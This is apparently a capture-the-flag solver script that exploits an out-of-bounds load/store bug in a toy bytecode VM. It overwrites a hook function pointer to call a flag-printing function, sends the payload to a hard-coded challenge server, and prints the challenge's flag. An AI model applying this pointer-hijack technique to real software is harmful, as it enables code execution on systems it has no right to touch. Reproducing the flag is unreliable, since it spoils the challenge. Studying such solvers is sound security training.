#!/usr/bin/env python3
"""
Sandworm VM — PWN Challenge Solver
====================================

Challenge:  Sandworm VM (UCSI Agentic AI CTF 2026)
Category:   PWN
Flag:       UCSI26{sandworm_vm_oob_escape_025a2ef7}

Vulnerability:
    Out-of-bounds memory access in VM relative load/store opcodes.
    The VM only validates the base register (r[b] <= 0xff) but does
    NOT validate the final computed index (r[b] + imm + 16), allowing
    access to internal VM metadata beyond the 256-cell sandbox.

Exploitation:
    1. Craft bytecode that reads the hook function pointer at cell 272
       (VM offset 0x880) using the OOB access: base=255, imm=1 → 255+1+16=272
    2. Add 0x1e0 to convert hook_default → emit_flag function
    3. Write the modified pointer back to cell 272
    4. Trigger the hook via opcode 0x16 → calls emit_flag()

VM Instruction Format:
    struct insn { uint8_t opcode, a, b, pad; int32_t imm; }  (8 bytes)

Key Offsets:
    vm + 0x000  registers[16]
    vm + 0x080  memory[256]     (cells, 8 bytes each)
    vm + 0x880  hook function pointer
    vm + 0x888  hook argument
    vm + 0x890  bytecode program
"""

from __future__ import annotations

import socket
import struct
import sys

# ── Configuration ─────────────────────────────────────────────────────

HOST = "52.76.96.108"
PORT = 9006


# ── Bytecode Construction ─────────────────────────────────────────────

def ins(op: int, a: int = 0, b: int = 0, imm: int = 0) -> bytes:
    """
    Encode a single VM instruction.

    Args:
        op:  Opcode byte
        a:   Register A (destination)
        b:   Register B (source)
        imm: 32-bit signed immediate value

    Returns:
        8-byte packed instruction
    """
    return struct.pack("<BBBBi", op, a, b, 0, imm)


def build_exploit_bytecode() -> bytes:
    """
    Build the exploit bytecode program.

    Instruction sequence:
        1. MOV r0, 255          ; set base register to max valid value
        2. RLOAD r1, [r0+1+16] ; OOB read cell 272 = hook_default ptr
        3. ADD r1, 0x1e0        ; offset to emit_flag function
        4. RSTORE [r0+1+16], r1 ; OOB write back to cell 272
        5. CALL hook             ; triggers emit_flag()
        6. HALT                  ; clean exit

    The OOB trick:
        - bounds check only verifies r0 <= 0xff (255 is valid)
        - actual index = r0 + imm + 16 = 255 + 1 + 16 = 272
        - cell 272 = offset 0x880 = hook function pointer
    """
    prog = b"".join([
        ins(0x01, 0, imm=255),      # r0 = 255
        ins(0x14, 1, 0, imm=1),     # r1 = cells[r0 + 1 + 16]  → read hook ptr
        ins(0x0d, 1, imm=0x1e0),    # r1 += 0x1e0             → emit_flag offset
        ins(0x15, 0, 1, imm=1),     # cells[r0 + 1 + 16] = r1 → write hook ptr
        ins(0x16, 2),               # call hook                → emit_flag()
        ins(0x00),                  # halt
    ])
    return prog


def build_payload() -> bytes:
    """
    Build the complete payload with length prefix.

    The VM expects:
        uint32_t program_length (little-endian)
        followed by the bytecode body
    """
    prog = build_exploit_bytecode()
    return struct.pack("<I", len(prog)) + prog


# ── Exploit Execution ─────────────────────────────────────────────────

def solve():
    """Send the exploit payload and capture the flag."""
    payload = build_payload()

    print(f"[*] Exploit payload: {len(payload)} bytes")
    print(f"[*] Bytecode size:   {len(payload) - 4} bytes ({(len(payload) - 4) // 8} instructions)")
    print(f"[*] Payload hex:     {payload.hex()}")
    print()
    print(f"[*] Connecting to {HOST}:{PORT}...")

    try:
        with socket.create_connection((HOST, PORT), timeout=15) as s:
            # Send the payload
            s.sendall(payload)
            s.shutdown(socket.SHUT_WR)

            # Receive the response
            chunks = []
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    chunks.append(data)
                except socket.timeout:
                    break

            response = b"".join(chunks)
            output = response.decode("utf-8", errors="replace")

            print(f"[*] Response ({len(response)} bytes):")
            print(output)
            print()

            # Extract flag
            import re
            flag_match = re.search(r"UCSI26\{[a-zA-Z0-9_\-]+\}", output)
            if flag_match:
                flag = flag_match.group()
                print(f"[+] FLAG FOUND: {flag}")
                return flag
            else:
                print("[!] Flag not found in output")
                print(f"[*] Raw hex: {response.hex()}")
                return None

    except ConnectionRefusedError:
        print(f"[!] Connection refused to {HOST}:{PORT}")
        print("[*] The challenge service may not be running")
        return None
    except socket.timeout:
        print(f"[!] Connection timed out to {HOST}:{PORT}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


# ── Entry Point ───────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  Sandworm VM — OOB Escape Exploit")
    print("  UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()

    # Print the exploit strategy
    print("[*] Strategy:")
    print("    1. MOV r0, 255        (max valid base register)")
    print("    2. RLOAD r1, [272]    (OOB read hook_default ptr)")
    print("    3. ADD r1, 0x1e0      (offset to emit_flag)")
    print("    4. RSTORE [272], r1   (OOB write hook ptr)")
    print("    5. CALL hook          (triggers emit_flag)")
    print("    6. HALT")
    print()

    flag = solve()

    if not flag:
        print()
        print("[!] Replay did not return a verified flag.")
